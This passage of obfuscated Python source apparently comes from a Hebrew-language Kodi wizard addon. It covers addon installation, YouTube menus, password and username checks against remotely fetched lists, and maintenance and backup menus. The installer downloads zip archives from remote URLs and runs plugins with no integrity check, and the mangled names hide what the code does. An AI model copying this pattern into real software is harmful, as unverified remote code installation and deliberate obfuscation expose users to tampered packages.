						addFile (O0000O00OOOO00O00 ,'addoninstall',O0O0O0000OOO00O0O ,O0O0OOO00OO0O0O00 ,description =O00OOO000OOO0O0O0 ,icon =O0O0O0O0O00O000OO ,fanart =O00OOOOO000O0OO00 ,themeit =THEME2 )#line:2505
					if O00O0O0OOO0OOOOO0 <1 :#line:2506
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2507
			else :#line:2508
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2509
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2510
		else :#line:2511
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2512
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2513
			addFile ('%s'%OO0OO000O000O00O0 ,'',themeit =THEME3 )#line:2514
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2515
	setView ('files','viewType')#line:2516
def addonInstaller (O00OO0O00OO0O0OOO ,O000OOOOO0O0O0OO0 ):#line:2518
	if not ADDONFILE =='http://':#line:2519
		OOO00O0O0O00OOO0O =wiz .workingURL (O000OOOOO0O0O0OO0 )#line:2520
		if OOO00O0O0O00OOO0O ==True :#line:2521
			OO0O000O0OOOO0O0O =wiz .openURL (O000OOOOO0O0O0OO0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2522
			O0OO00OOO0000O000 =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O00OO0O00OO0O0OOO ).findall (OO0O000O0OOOO0O0O )#line:2523
			if len (O0OO00OOO0000O000 )>0 :#line:2524
				for O0OOOO000000O000O ,O000OOOOO0O0O0OO0 ,O000O0OOO0000OO00 ,O0OOOO00OO0OOOO0O ,OO00O0O0000000000 ,O0O0000OO0OOOO0OO ,O000O0O0000OOO0O0 ,OO0000OO000O0O000 ,O0O00OOOO0000O0O0 in O0OO00OOO0000O000 :#line:2525
					if os .path .exists (os .path .join (ADDONS ,O00OO0O00OO0O0OOO )):#line:2526
						OOOOO00O0O0O0OO00 =['Launch Addon','Remove Addon']#line:2527
						OOOOO00OOOOO00O00 =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OOOOO00O0O0O0OO00 )#line:2528
						if OOOOO00OOOOO00O00 ==0 :#line:2529
							wiz .ebi ('RunAddon(%s)'%O00OO0O00OO0O0OOO )#line:2530
							xbmc .sleep (1000 )#line:2531
							return True #line:2532
						elif OOOOO00OOOOO00O00 ==1 :#line:2533
							wiz .cleanHouse (os .path .join (ADDONS ,O00OO0O00OO0O0OOO ))#line:2534
							try :wiz .removeFolder (os .path .join (ADDONS ,O00OO0O00OO0O0OOO ))#line:2535
							except :pass #line:2536
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O00OO0O00OO0O0OOO ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2537
								removeAddonData (O00OO0O00OO0O0OOO )#line:2538
							wiz .refresh ()#line:2539
							return True #line:2540
						else :#line:2541
							return False #line:2542
					OO0OOO0OO000O000O =os .path .join (ADDONS ,O000O0OOO0000OO00 )#line:2543
					if not O000O0OOO0000OO00 .lower ()=='none'and not os .path .exists (OO0OOO0OO000O000O ):#line:2544
						wiz .log ("Repository not installed, installing it")#line:2545
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O00OO0O00OO0O0OOO ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O000O0OOO0000OO00 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2546
							O0OOO00O0OOO000O0 =wiz .parseDOM (wiz .openURL (O0OOOO00OO0OOOO0O ),'addon',ret ='version',attrs ={'id':O000O0OOO0000OO00 })#line:2547
							if len (O0OOO00O0OOO000O0 )>0 :#line:2548
								O000OOO00OOOO0O00 ='%s%s-%s.zip'%(OO00O0O0000000000 ,O000O0OOO0000OO00 ,O0OOO00O0OOO000O0 [0 ])#line:2549
								wiz .log (O000OOO00OOOO0O00 )#line:2550
								if KODIV >=17 :wiz .addonDatabase (O000O0OOO0000OO00 ,1 )#line:2551
								installAddon (O000O0OOO0000OO00 ,O000OOO00OOOO0O00 )#line:2552
								wiz .ebi ('UpdateAddonRepos()')#line:2553
								wiz .log ("Installing Addon from Kodi")#line:2555
								O0O00O00O0OOO0OOO =installFromKodi (O00OO0O00OO0O0OOO )#line:2556
								wiz .log ("Install from Kodi: %s"%O0O00O00O0OOO0OOO )#line:2557
								if O0O00O00O0OOO0OOO :#line:2558
									wiz .refresh ()#line:2559
									return True #line:2560
							else :#line:2561
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O000O0OOO0000OO00 )#line:2562
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O00OO0O00OO0O0OOO ,O000O0OOO0000OO00 ))#line:2563
					elif O000O0OOO0000OO00 .lower ()=='none':#line:2564
						wiz .log ("No repository, installing addon")#line:2565
						O0000OO00OOOO0O0O =O00OO0O00OO0O0OOO #line:2566
						O00O0OOOOO0OOOOOO =O000OOOOO0O0O0OO0 #line:2567
						installAddon (O00OO0O00OO0O0OOO ,O000OOOOO0O0O0OO0 )#line:2568
						wiz .refresh ()#line:2569
						return True #line:2570
					else :#line:2571
						wiz .log ("Repository installed, installing addon")#line:2572
						O0O00O00O0OOO0OOO =installFromKodi (O00OO0O00OO0O0OOO ,False )#line:2573
						if O0O00O00O0OOO0OOO :#line:2574
							wiz .refresh ()#line:2575
							return True #line:2576
					if os .path .exists (os .path .join (ADDONS ,O00OO0O00OO0O0OOO )):return True #line:2577
					O0OOOO00O0000O0OO =wiz .parseDOM (wiz .openURL (O0OOOO00OO0OOOO0O ),'addon',ret ='version',attrs ={'id':O00OO0O00OO0O0OOO })#line:2578
					if len (O0OOOO00O0000O0OO )>0 :#line:2579
						O000OOOOO0O0O0OO0 ="%s%s-%s.zip"%(O000OOOOO0O0O0OO0 ,O00OO0O00OO0O0OOO ,O0OOOO00O0000O0OO [0 ])#line:2580
						wiz .log (str (O000OOOOO0O0O0OO0 ))#line:2581
						if KODIV >=17 :wiz .addonDatabase (O00OO0O00OO0O0OOO ,1 )#line:2582
						installAddon (O00OO0O00OO0O0OOO ,O000OOOOO0O0O0OO0 )#line:2583
						wiz .refresh ()#line:2584
					else :#line:2585
						wiz .log ("no match");return False #line:2586
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2587
		else :wiz .log ("[Addon Installer] Text File: %s"%OOO00O0O0O00OOO0O )#line:2588
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2589
def installFromKodi (O0O000000000OOO00 ,over =True ):#line:2591
	if over ==True :#line:2592
		xbmc .sleep (2000 )#line:2593
	wiz .ebi ('RunPlugin(plugin://%s)'%O0O000000000OOO00 )#line:2595
	if not wiz .whileWindow ('yesnodialog'):#line:2596
		return False #line:2597
	xbmc .sleep (1000 )#line:2598
	if wiz .whileWindow ('okdialog'):#line:2599
		return False #line:2600
	wiz .whileWindow ('progressdialog')#line:2601
	if os .path .exists (os .path .join (ADDONS ,O0O000000000OOO00 )):return True #line:2602
	else :return False #line:2603
def installAddon (O000000OOO0O00OOO ,O00O000OO0O0OOO0O ):#line:2605
	if not wiz .workingURL (O00O000OO0O0OOO0O )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O000000OOO0O00OOO ,COLOR2 ));return #line:2606
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2607
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000000OOO0O00OOO ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2608
	OOOO00O00OOOOO000 =O00O000OO0O0OOO0O .split ('/')#line:2609
	O0O0O0000O000OOOO =os .path .join (PACKAGES ,OOOO00O00OOOOO000 [-1 ])#line:2610
	try :os .remove (O0O0O0000O000OOOO )#line:2611
	except :pass #line:2612
	downloader .download (O00O000OO0O0OOO0O ,O0O0O0000O000OOOO ,DP )#line:2613
	O0O0O00OOO000000O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000000OOO0O00OOO )#line:2614
	DP .update (0 ,O0O0O00OOO000000O ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2615
	OO0O00O0O0O0O0000 ,OOO0OOOO0O0O000OO ,OOO0O00OOO0O00000 =extract .all (O0O0O0000O000OOOO ,ADDONS ,DP ,title =O0O0O00OOO000000O )#line:2616
	DP .update (0 ,O0O0O00OOO000000O ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2617
	installed (O000000OOO0O00OOO )#line:2618
	installDep (O000000OOO0O00OOO ,DP )#line:2619
	DP .close ()#line:2620
	wiz .ebi ('UpdateAddonRepos()')#line:2621
	wiz .ebi ('UpdateLocalAddons()')#line:2622
	wiz .refresh ()#line:2623
def installDep (O0O00O00OOO0OO00O ,DP =None ):#line:2625
	O00OO0OO0000O0O0O =os .path .join (ADDONS ,O0O00O00OOO0OO00O ,'addon.xml')#line:2626
	if os .path .exists (O00OO0OO0000O0O0O ):#line:2627
		O00O00O0OOOO00O0O =open (O00OO0OO0000O0O0O ,mode ='r');O0000OO000O00OOO0 =O00O00O0OOOO00O0O .read ();O00O00O0OOOO00O0O .close ();#line:2628
		OOOOO0OOOOO00OO0O =wiz .parseDOM (O0000OO000O00OOO0 ,'import',ret ='addon')#line:2629
		for O0OO0O0OOOO000O0O in OOOOO0OOOOO00OO0O :#line:2630
			if not 'xbmc.python'in O0OO0O0OOOO000O0O :#line:2631
				if not DP ==None :#line:2632
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OO0O0OOOO000O0O ))#line:2633
				wiz .createTemp (O0OO0O0OOOO000O0O )#line:2634
def installed (OO00OOO0OOOOOOO00 ):#line:2661
	OOO0O0OOOO0OO0OO0 =os .path .join (ADDONS ,OO00OOO0OOOOOOO00 ,'addon.xml')#line:2662
	if os .path .exists (OOO0O0OOOO0OO0OO0 ):#line:2663
		try :#line:2664
			OO000O000O0000O0O =open (OOO0O0OOOO0OO0OO0 ,mode ='r');O0OOOO00O0OO0OOOO =OO000O000O0000O0O .read ();OO000O000O0000O0O .close ()#line:2665
			OOO0OO00OOO0000O0 =wiz .parseDOM (O0OOOO00O0OO0OOOO ,'addon',ret ='name',attrs ={'id':OO00OOO0OOOOOOO00 })#line:2666
			OOOOO0000O0OO00O0 =os .path .join (ADDONS ,OO00OOO0OOOOOOO00 ,'icon.png')#line:2667
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0OO00OOO0000O0 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OOOOO0000O0OO00O0 )#line:2668
		except :pass #line:2669
def youtubeMenu (url =None ):#line:2671
	if not YOUTUBEFILE =='http://':#line:2672
		if url ==None :#line:2673
			O00O0O000OO000OO0 =wiz .workingURL (YOUTUBEFILE )#line:2674
			O0O0OOOOO0O0O000O =uservar .YOUTUBEFILE #line:2675
		else :#line:2676
			O00O0O000OO000OO0 =wiz .workingURL (url )#line:2677
			O0O0OOOOO0O0O000O =url #line:2678
		if O00O0O000OO000OO0 ==True :#line:2679
			O0OO00O0OO0OOO000 =wiz .openURL (O0O0OOOOO0O0O000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2680
			O0O00O00O00O0O00O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0OO00O0OO0OOO000 )#line:2681
			if len (O0O00O00O00O0O00O )>0 :#line:2682
				for O0OOOO00O00OOOOO0 ,O000O0OOO0OO00OO0 ,url ,O00OO00000OOO0000 ,OO0O0OO0OOOOO00O0 ,OOOOO0O00O00000OO in O0O00O00O00O0O00O :#line:2683
					if O000O0OOO0OO00OO0 .lower ()=="yes":#line:2684
						addDir ("[B]%s[/B]"%O0OOOO00O00OOOOO0 ,'youtube',url ,description =OOOOO0O00O00000OO ,icon =O00OO00000OOO0000 ,fanart =OO0O0OO0OOOOO00O0 ,themeit =THEME3 )#line:2685
					else :#line:2686
						addFile (O0OOOO00O00OOOOO0 ,'viewVideo',url =url ,description =OOOOO0O00O00000OO ,icon =O00OO00000OOO0000 ,fanart =OO0O0OO0OOOOO00O0 ,themeit =THEME2 )#line:2687
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2688
		else :#line:2689
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2690
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2691
			addFile ('%s'%O00O0O000OO000OO0 ,'',themeit =THEME3 )#line:2692
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2693
	setView ('files','viewType')#line:2694
def STARTP ():#line:2695
	OOOOOO0OO000OO00O =(ADDON .getSetting ("pass"))#line:2696
	if BUILDNAME =="":#line:2697
	 if not NOTIFY =='true':#line:2698
          O00OOO0O0O0OOO0O0 =wiz .workingURL (NOTIFICATION )#line:2699
	 if not NOTIFY2 =='true':#line:2700
          O00OOO0O0O0OOO0O0 =wiz .workingURL (NOTIFICATION2 )#line:2701
	 if not NOTIFY3 =='true':#line:2702
          O00OOO0O0O0OOO0O0 =wiz .workingURL (NOTIFICATION3 )#line:2703
	O000O00OOO00O0O00 =OOOOOO0OO000OO00O #line:2704
	O00OOO0O0O0OOO0O0 =urllib2 .Request (SPEED )#line:2705
	O00O00O0O00000OOO =urllib2 .urlopen (O00OOO0O0O0OOO0O0 )#line:2706
	O0O000O00O0O0OO0O =O00O00O0O00000OOO .readlines ()#line:2708
	OO00O0O00O000O000 =0 #line:2712
	for OOO0000O0O0O0OO0O in O0O000O00O0O0OO0O :#line:2713
		if OOO0000O0O0O0OO0O .split (' ==')[0 ]==OOOOOO0OO000OO00O or OOO0000O0O0O0OO0O .split ()[0 ]==OOOOOO0OO000OO00O :#line:2714
			OO00O0O00O000O000 =1 #line:2715
			break #line:2716
	if OO00O0O00O000O000 ==0 :#line:2717
					OO0OOO00OOO0000OO =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2718
					if OO0OOO00OOO0000OO :#line:2720
						ADDON .openSettings ()#line:2722
						sys .exit ()#line:2724
					else :#line:2725
						sys .exit ()#line:2726
	return 'ok'#line:2730
def STARTP2 ():#line:2731
	OO00O00OOOOO00O0O =(ADDON .getSetting ("user"))#line:2732
	OO0000O0OOO0O0000 =(UNAME )#line:2734
	O0O0000O00OO00O0O =urllib2 .urlopen (OO0000O0OOO0O0000 )#line:2735
	O0OOOOOO0OOO00O00 =O0O0000O00OO00O0O .readlines ()#line:2736
	OO00OOOO0OOOO0O00 =0 #line:2737
	for O0O0O0O00OO00O00O in O0OOOOOO0OOO00O00 :#line:2740
		if O0O0O0O00OO00O00O .split (' ==')[0 ]==OO00O00OOOOO00O0O or O0O0O0O00OO00O00O .split ()[0 ]==OO00O00OOOOO00O0O :#line:2741
			OO00OOOO0OOOO0O00 =1 #line:2742
			break #line:2743
	if OO00OOOO0OOOO0O00 ==0 :#line:2744
		O0O000O0OO0O00OOO =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2745
		if O0O000O0OO0O00OOO :#line:2747
			ADDON .openSettings ()#line:2749
			sys .exit ()#line:2752
		else :#line:2753
			sys .exit ()#line:2754
	return 'ok'#line:2758
def passandpin ():#line:2759
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2760
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2761
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2762
def passandUsername ():#line:2763
	ADDON .openSettings ()#line:2764
def folderback ():#line:2767
    O00OOO0OO0O0000OO =ADDON .getSetting ("path")#line:2768
    if O00OOO0OO0O0000OO :#line:2769
      O00OOO0OO0O0000OO =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2770
      ADDON .setSetting ("path",O00OOO0OO0O0000OO )#line:2771
def backmyupbuild ():#line:2774
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2778
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2779
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2780
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2782
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2783
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2784
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2786
def maintMenu (view =None ):#line:2790
	OOOO0O0OOOOOO00O0 ='[B][COLOR green]ON[/COLOR][/B]';OO00O000O00000OOO ='[B][COLOR red]OFF[/COLOR][/B]'#line:2792
	O0O0OOO0O000O0O0O ='true'if AUTOCLEANUP =='true'else 'false'#line:2793
	OO00OOOO0O0O0O000 ='true'if AUTOCACHE =='true'else 'false'#line:2794
	O0OOOOOO0OOOOOO00 ='true'if AUTOPACKAGES =='true'else 'false'#line:2795
	OO000000000000OOO ='true'if AUTOTHUMBS =='true'else 'false'#line:2796
	O0OO00OOO00O000O0 ='true'if SHOWMAINT =='true'else 'false'#line:2797
	OO0O000O00OOOO000 ='true'if INCLUDEVIDEO =='true'else 'false'#line:2798
	OO0O00O0000O0000O ='true'if INCLUDEALL =='true'else 'false'#line:2799
	O00O0000000O00O00 ='true'if THIRDPARTY =='true'else 'false'#line:2800
	if wiz .Grab_Log (True )==False :O00OO00O00O0OO0OO =0 #line:2801
	else :O00OO00O00O0OO0OO =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2802
	if wiz .Grab_Log (True ,True )==False :O000OOO0O0OOO0O0O =0 #line:2803
	else :O000OOO0O0OOO0O0O =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2804
	OOO0OO000O00O0OOO =int (O00OO00O00O0OO0OO )+int (O000OOO0O0OOO0O0O )#line:2805
	O0OO0O00OOO0OO0OO =str (OOO0OO000O00O0OOO )+' Error(s) Found'if OOO0OO000O00O0OOO >0 else 'None Found'#line:2806
	O000000O0O0O0OO00 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2807
	if OO0O00O0000O0000O =='true':#line:2808
		O0000OO00OO000OOO ='true'#line:2809
		OO0O0O00OOO0O0OO0 ='true'#line:2810
		O0O0OOOOOOO00O0OO ='true'#line:2811
		OO0O0OO000OO00O0O ='true'#line:2812
		OO00O0OO0OOOOO0OO ='true'#line:2813
		O0O00OOO00O000OO0 ='true'#line:2814
		OOO0O0O00O0OO000O ='true'#line:2815
		OO0OO0O0O00O0O0OO ='true'#line:2816
	else :#line:2817
		O0000OO00OO000OOO ='true'if INCLUDEBOB =='true'else 'false'#line:2818
		OO0O0O00OOO0O0OO0 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2819
		O0O0OOOOOOO00O0OO ='true'if INCLUDESPECTO =='true'else 'false'#line:2820
		OO0O0OO000OO00O0O ='true'if INCLUDEGENESIS =='true'else 'false'#line:2821
		OO00O0OO0OOOOO0OO ='true'if INCLUDEEXODUS =='true'else 'false'#line:2822
		O0O00OOO00O000OO0 ='true'if INCLUDEONECHAN =='true'else 'false'#line:2823
		OOO0O0O00O0OO000O ='true'if INCLUDESALTS =='true'else 'false'#line:2824
		OO0OO0O0O00O0O0OO ='true'if INCLUDESALTSHD =='true'else 'false'#line:2825
	O0O00OO0O0O0OO000 =wiz .getSize (PACKAGES )#line:2826
	OO0000O000000OO0O =wiz .getSize (THUMBS )#line:2827
	O0O0O00O00O00OO00 =wiz .getCacheSize ()#line:2828
	OO0O0OOO0OO00O0O0 =O0O00OO0O0O0OO000 +OO0000O000000OO0O +O0O0O00O00O00OO00 #line:2829
	O0OOOO00OO0O00OO0 =['Daily','Always','3 Days','Weekly']#line:2830
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2831
	if view =="clean"or SHOWMAINT =='true':#line:2832
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0O0OOO0OO00O0O0 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2833
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0O0O00O00O00OO00 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2834
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0O00OO0O0O0OO000 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2835
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0000O000000OO0O ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2836
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2837
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2838
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2839
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2840
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2841
	if view =="addon"or SHOWMAINT =='false':#line:2842
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2843
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2844
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2845
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2846
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2847
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2848
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2849
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2850
	if view =="misc"or SHOWMAINT =='true':#line:2851
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2852
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2853
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2854
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2855
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2856
		addFile ('View Errors in Log: %s'%(O0OO0O00OOO0OO0OO ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2857
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2858
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2859
		addFile ('Clear Wizard Log File%s'%O000000O0O0O0OO00 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2860
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2861
	if view =="backup"or SHOWMAINT =='true':#line:2862
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2863
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2864
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2865
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2866
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2867
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2868
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2869
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2870
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2871
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2872
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2873
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2874
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2875
	if view =="tweaks"or SHOWMAINT =='true':#line:2876
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2877
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2878
		else :#line:2879
			if os .path .exists (ADVANCED ):#line:2880
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2881
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2882
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2883
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2884
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2885
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2886
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2887
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2888
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2889
	addFile ('Show All Maintenance: %s'%O0OO00OOO00O000O0 .replace ('true',OOOO0O0OOOOOO00O0 ).replace ('false',OO00O000O00000OOO ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2890
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2891
	addFile ('Third Party Wizards: %s'%O00O0000000O00O00 .replace ('true',OOOO0O0OOOOOO00O0 ).replace ('false',OO00O000O00000OOO ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2892
	if O00O0000000O00O00 =='true':#line:2893
		O00OO000000OOOOO0 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2894
		OOO0O0OO00OOO00O0 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2895
		O0OOO0O0O00000OOO =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2896
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O00OO000000OOOOO0 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2897
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOO0O0OO00OOO00O0 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2898
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0OOO0O0O00000OOO ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2899
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2900
